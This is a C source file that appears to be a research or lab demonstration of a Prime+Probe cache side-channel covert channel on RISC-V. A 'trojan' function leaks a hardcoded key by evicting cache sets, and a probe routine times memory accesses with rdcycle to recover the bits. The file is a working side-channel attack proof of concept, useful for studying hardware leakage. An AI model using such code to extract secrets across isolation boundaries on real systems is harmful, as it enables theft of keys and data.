#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define CACHE_SETS 256
#define CACHE_WAYS 8
#define CACHE_LINE_SIZE 16
#define cache_size (CACHE_SETS * CACHE_WAYS * CACHE_LINE_SIZE) / CACHE_LINE_SIZE

#define iterations 200 	//number of times to run the attack
#define threshold 30	//threshold above which we have a cache miss
	
volatile unsigned miss[cache_size] = {0};	//array which holds the misses of each cache line


/********helper function to convert string to bits**********/


char* stringToBinary(char* s) {
    if(s == NULL) return 0; /* no input string */
    size_t len = strlen(s);
    char *binary = malloc(len*8 + 1); // each char is one byte (8 bits) and + 1 at the end for null terminator
    binary[0] = '\0';
    for(size_t i = 0; i < len; ++i) {
        char ch = s[i];
        for(int j = 7; j >= 0; --j){
            if(ch & (1 << j)) {
                strcat(binary,"1");
            } else {
                strcat(binary,"0");
            }
        }
    }
    return binary;
}




/*************PRIME FUNCTION******************/

void prime(__uint128_t *array){
	__uint128_t temp = 1;
	//fill the cache with arbitrary data
	for (int i = 0 ; i < cache_size ; i++ ){
		array[i] = 16;		
		temp = array[i];	//read it in order to load the array into the cache
	}
}



/*************PROBE FUNCTION******************/

void probe(__uint128_t *array){
	__uint128_t temp = 1;	//temp variable to read the array data in order to load them into the cache
	register unsigned long start,end,diff;	//variables to measure access time
	for ( int i = 0 ; i < cache_size ; i++){
		asm volatile ("rdcycle %0" : "=r" (start));
		temp = array[i];
		asm volatile ("rdcycle %0" : "=r" (end));
		diff = end - start;
		if(diff > threshold){
			miss[i]++;
		}
	}
}



/**************TROJAN CODE*********************/

void trojan(char *key){
	//trojan will evict specific cache lines according to the bits of the secret key
	__uint128_t trojan_array[cache_size] __attribute__((aligned(128)));			//trojan_array starts at set 160
	__uint128_t temp = 16;
	//transform the key into bits
	char* key_bits;
	key_bits = stringToBinary(key);
	size_t keylength = strlen(key_bits);
	//evict the sets starting from 0 if the bit is 1, otherwise dont evict
	for ( int i = 0 ; i < keylength; i++){
		if (key_bits[i] == '1'){
			for ( int j = 0 ; j < cache_size ; j++){
				//evict at position i+j (set 0 for first bit, set 1 for second bit, etc.)
				if( j % 256 == 0 ){		//evict all ways of the same set
					trojan_array[j+i+8] = 77;
					temp = trojan_array[j+i+8];	//add 8 to get to the same set as the prime_array
				}
			}
		}
	}
}


/*************VICTIM FUNCTION******************/

void victim(){
	char *key = "aa";
	trojan(key);
}


/**************function to reconstruct the secret key***************/

void reconstruct(int *bin_key){
	int k = 0 ;	//specifies the character we are decoding
	char *decoded_key = (char *)malloc((k+1)*sizeof(char));	//alocate memory for 1 character

	//keep decoding untill we hit 8 bits of 0 which indicate end of string
	int end = 0 ;
	int num, z, j;
	while(end == 0){
		num = 0 ;
		z = 0;
		for (j = 7 ; j >= 0 ; j --){
			num = num + (bin_key[(k*8)+j] << z);
			z++;
		}
		if ( num != 0 ){
			decoded_key[k] = num;
			k++;
			decoded_key = realloc(decoded_key,((k+1)*sizeof(char)));
		}
		else {
			decoded_key[k] = '\0';
			end = 1;
		}		
	}

	printf("Decoded key is %s\n",decoded_key);
}




/***********function to read the evicted sets***************/
void read_sets(){
	int i = 0;
	int evicted_ways[256] = {0};	//keep amount of way evictions in each set
	int evictions = 0 ;
	//find out how many ways of each set got evicted
	for(i = 0 ; i < cache_size ; i++){
		int way = i/256;
		int set = i - (way*256);
		if(miss[i] > 160){
			//printf("Index %d, Cache way %d, Set %d got evicted %d times\n",i,way,set,miss[i]);
			evicted_ways[set]++;
			evictions++;
		}
		
	}

	int total_sets_evicted = 0 ;
	int set_evicted[256] = {0};	//array which specifies which sets are evicted and which not
	//if a set got at least 6 of its 8 ways evicted then its an evicted set
	for(i = 0 ; i < 256; i++){
		if(evicted_ways[i] > 5){
			printf("Set %d got %d evictions\n",i,evicted_ways[i]);
			total_sets_evicted++;
			set_evicted[i] = 1;
		}
	}

	printf("Total evictions %d\n",evictions);
	printf("Total sets evicted %d\n",total_sets_evicted);

	//reconstruct(set_evicted);
}






int main(){
	__uint128_t prime_array[cache_size] __attribute__((aligned(128))); //define array the size of the cache
	int i = 0 ;
	//uint64_t addr;

	//prime array starts at set 168

	for (i = 0 ; i < iterations ; i ++){
		prime(prime_array);		//prime the cache
		victim();
		probe(prime_array);		//probe the cache
	}

	read_sets();

	


	/******reassembling the secret key*********/

	//reconstruct(set_evicted);	//pass as argument the array which holds which sets were evicted

	//printf("Address of i is 0x%x\n",&i);
	//printf("Address of iterations is 0x%x\n",&iterations);
	// printf("Address of cache_size is 0x%x\n",&cache_size);
	// printf("Address of evicted_ways is 0x%x\n",&evicted_ways[0]);
	// printf("Address of evictions is 0x%x\n",&evictions);
	// printf("Address of way is 0x%x\n",&way);




	return 0;

}